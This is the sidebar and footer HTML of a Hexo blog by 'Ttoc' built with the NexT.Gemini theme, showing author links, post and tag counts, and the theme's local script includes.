        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Ttoc"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">Ttoc</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">51</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/try-to-change" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;try-to-change" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:wejoke3@gmail.com" title="E-Mail → mailto:wejoke3@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2022 – 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ttoc</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>